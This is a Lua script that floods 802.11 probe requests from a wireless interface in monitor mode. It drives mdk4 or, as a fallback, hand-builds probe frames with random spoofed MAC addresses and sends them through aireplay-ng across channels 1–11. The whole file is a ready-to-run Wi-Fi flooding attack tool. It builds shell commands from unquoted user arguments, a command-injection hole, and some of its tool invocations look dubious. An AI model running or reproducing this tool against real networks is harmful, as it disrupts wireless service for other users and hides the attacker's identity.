local iface = arg[1]
local count = tonumber(arg[2]) or 100
local ssid = arg[3] or ""

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":"","ssid":' .. json_escape(ssid) .. ',"channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function set_channel(ch)
  local cmd = "iw dev " .. iface .. " set channel " .. tostring(ch) .. " 2>/dev/null"
  local cmd2 = "iwconfig " .. iface .. " channel " .. tostring(ch) .. " 2>/dev/null"
  os.execute(cmd)
  os.execute(cmd2)
end

local function random_mac()
  local mac_parts = {}
  for i = 1, 6 do
    table.insert(mac_parts, string.format("%02x", math.random(0, 255)))
  end
  -- Ensure locally administered, unicast
  mac_parts[1] = string.format("%02x", (tonumber(mac_parts[1], 16) & 0xfe) | 0x02)
  return table.concat(mac_parts, ":")
end

local function build_probe_request(src_mac, probe_ssid)
  -- Frame control: management, subtype 4 (probe request)
  local frame = string.char(0x40, 0x00)
  -- Duration
  frame = frame .. string.char(0x00, 0x00)
  -- Destination: broadcast
  frame = frame .. string.char(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
  -- Source (random MAC)
  for b in src_mac:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  -- BSSID: broadcast
  frame = frame .. string.char(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
  -- Fragment/sequence
  frame = frame .. string.char(0x00, 0x00)

  -- Probe request body
  local p_ssid = probe_ssid
  if not p_ssid or #p_ssid == 0 then
    p_ssid = ""
  end
  local ssid_len = #p_ssid
  if ssid_len > 32 then ssid_len = 32 end
  -- SSID element (tag 0)
  frame = frame .. string.char(0x00, ssid_len) .. p_ssid:sub(1, ssid_len)

  -- Supported rates (tag 1)
  frame = frame .. string.char(0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)

  -- Extended supported rates (tag 50)
  frame = frame .. string.char(0x32, 0x04, 0x30, 0x48, 0x60, 0x6c)

  -- HT Capabilities (tag 45) - channel width
  frame = frame .. string.char(0x2d, 0x1a)
  for i = 1, 26 do
    frame = frame .. string.char(0x00)
  end

  return frame
end

local function inject_via_mdk4()
  local cmd = "mdk4 " .. iface .. " p -t " .. ssid
  if ssid and #ssid > 0 then
    cmd = cmd .. " -e " .. ssid
  end
  cmd = cmd .. " -s " .. tostring(count) .. " 2>/dev/null"

  telemetry("probe_start", '{"method":"mdk4","cmd":' .. json_escape(cmd) .. '}')

  local f = io.popen(cmd)
  if not f then
    telemetry("probe_fail", '{"method":"mdk4","error":"Failed to start mdk4"}')
    return false
  end

  local sent = 0
  while true do
    local line = f:read("*l")
    if not line then break end
    if line:find("Packets") or line:find("packets") then
      sent = sent + 1
      if sent % 100 == 0 then
        telemetry("probe_sent", '{"method":"mdk4","sent":' .. tostring(sent) .. '}')
      end
    end
  end
  f:close()
  telemetry("probe_complete", '{"method":"mdk4","sent":' .. tostring(sent) .. '}')
  return true
end

local function inject_probe_frames()
  telemetry("probe_inject_start", '{"count":' .. tostring(count) .. ',"ssid":' .. json_escape(ssid) .. '}')

  local channels = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}
  local probes_per_ch = math.ceil(count / #channels)
  local total_sent = 0
  local tmp_dir = "/tmp/probe_flood_" .. iface .. "/"
  os.execute("mkdir -p " .. tmp_dir)

  for _, ch in ipairs(channels) do
    if total_sent >= count then break end
    set_channel(ch)
    telemetry("channel_switch", '{"channel":' .. tostring(ch) .. '}')

    local batch = math.min(probes_per_ch, count - total_sent)
    local tmp = tmp_dir .. "probe_ch" .. tostring(ch) .. ".bin"
    local f = io.open(tmp, "wb")
    if not f then
      telemetry("write_fail", '{"channel":' .. tostring(ch) .. '}')
      break
    end

    for i = 1, batch do
      local src_mac = random_mac()
      local frame = build_probe_request(src_mac, ssid)
      f:write(frame)
      total_sent = total_sent + 1
    end
    f:close()

    local cmd = "cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null"
    os.execute(cmd .. " &")

    telemetry("probe_batch", '{"channel":' .. tostring(ch) .. ',"count":' .. tostring(batch) .. ',"total_sent":' .. tostring(total_sent) .. '}')
  end

  telemetry("probe_inject_done", '{"total_sent":' .. tostring(total_sent) .. '}')
  return total_sent
end

if not iface then
  telemetry("error", '{"error":"Usage: probe_flood.lua <interface> [count] [ssid]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

math.randomseed(os.time())

local ok = inject_via_mdk4()
if not ok then
  telemetry("fallback", '{"message":"mdk4 not available, using raw probe injection"}')
  inject_probe_frames()
end

telemetry("complete", '{"total_probes":' .. tostring(count) .. '}')
